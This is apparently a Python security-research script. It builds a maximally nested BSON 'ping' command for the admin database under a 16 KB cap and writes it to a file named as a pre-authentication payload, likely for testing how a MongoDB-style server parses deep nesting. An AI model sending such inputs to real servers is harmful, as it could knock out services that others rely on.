import struct, sys

def build_nested(levels, inner_field=b"a"):
    # Build from innermost outward, iteratively (no python recursion).
    # innermost value: {"a": 1}
    doc = struct.pack("<i", 4+1+len(inner_field)+1+4+1) # placeholder, recompute properly below
    # Build properly: start with an empty-ish leaf and wrap iteratively.
    leaf = b"\x10" + inner_field + b"\x00" + struct.pack("<i", 1)  # int32 field "a"=1
    body = leaf + b"\x00"
    obj = struct.pack("<i", 4+len(body)) + body
    for _ in range(levels):
        elem = b"\x03" + inner_field + b"\x00" + obj  # type 0x03 = embedded document, field "a"
        body = elem + b"\x00"
        obj = struct.pack("<i", 4+len(body)) + body
    return obj

def wrap_command(nested_obj, cmd_name=b"ping", extra_field=b"x"):
    # {"ping":1, "$db":"admin", "x": <nested_obj>}
    parts = b""
    parts += b"\x10" + cmd_name + b"\x00" + struct.pack("<i", 1)
    dbval = b"admin\x00"
    parts += b"\x02" + b"$db\x00" + struct.pack("<i", len(dbval)) + dbval
    parts += b"\x03" + extra_field + b"\x00" + nested_obj
    body = parts + b"\x00"
    return struct.pack("<i", 4+len(body)) + body

# Binary-search the max nesting levels that fit under 16000 bytes (leave headroom under the 16384 cap).
lo, hi = 1, 4000
best = None
while lo <= hi:
    mid = (lo+hi)//2
    nested = build_nested(mid)
    full = wrap_command(nested)
    if len(full) <= 16000:
        best = (mid, len(full))
        lo = mid+1
    else:
        hi = mid-1

print("max levels within 16000 bytes:", best)

levels, size = best
nested = build_nested(levels)
full = wrap_command(nested)
with open("/tmp/preauth_deep_command.bson", "wb") as f:
    f.write(full)
print("wrote", len(full), "bytes,", levels, "levels of nesting")

# Sanity check with pymongo's own bson decoder (structural decode only, lazy at top level;
# doesn't need to recurse to decode the top-level doc itself).
import bson
try:
    d = bson.BSON(full).decode()
    print("top-level decode OK, keys:", list(d.keys()))
except Exception as e:
    print("decode error:", e)
